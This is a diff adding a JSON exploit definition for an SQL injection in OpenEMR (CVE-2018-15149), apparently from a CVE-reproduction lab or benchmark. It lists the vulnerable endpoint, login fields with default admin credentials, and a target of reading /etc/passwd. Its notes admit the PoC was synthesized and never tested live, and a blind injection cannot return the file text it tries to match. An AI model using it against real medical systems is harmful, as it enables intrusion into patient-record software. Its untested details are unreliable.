@@ -1,0 +1,39 @@
+{
+  "cve": "CVE-2018-15149",
+  "name": "OpenEMR prior to 5.0.1.4 SQL Injection in encounter parameter",
+  "description": "SQL Injection in interface/forms/eye_mag/php/Anything_simple.php via the encounter parameter, which is passed unsanitized to getProviderIdOfEncounter() in library/forms.inc",
+  "disclosure_date": "2018-08-13",
+  "edb": null,
+  "vuln_class": "sqli",
+  "vuln_endpoint": "/interface/forms/eye_mag/php/Anything_simple.php",
+  "vuln_method": "GET",
+  "vuln_params": {
+    "encounter": "{{sqli_payload}}"
+  },
+  "auth_endpoint": "/interface/main/main_screen.php?auth=login&site={{site}}",
+  "auth_params": {
+    "new_login_session_management": "1",
+    "authProvider": "Default",
+    "authUser": "{{user}}",
+    "clearPass": "{{password}}",
+    "languageChoice": "1"
+  },
+  "confirm_pattern": "root:x:0:0",
+  "fail_markers": ["login", "Login", "Invalid", "denied", "error"],
+  "default_username": "admin",
+  "default_filepath": "/etc/passwd",
+  "target_uri": "/",
+  "module_type": "auxiliary",
+  "author": "AMENDER / Rezwanul Haque",
+  "default_password": "",
+  "references": [
+    ["CVE", "2018-15149"],
+    ["URL", "https://github.com/openemr/openemr/pull/1757"]
+  ],
+  "login_params": {
+    "new_login_session_management": "1",
+    "authProvider": "Default",
+    "languageChoice": "1"
+  },
+  "_notes": "No EDB entry exists. PoC synthesized. The SQL injection is blind (time-based/error-based). Vulnerable code confirmed in library/forms.inc:getProviderIdOfEncounter() - encounter parameter directly concatenated into SQL. Lab container has session persistence issues preventing live test - vulnerability confirmed via code review."
+}
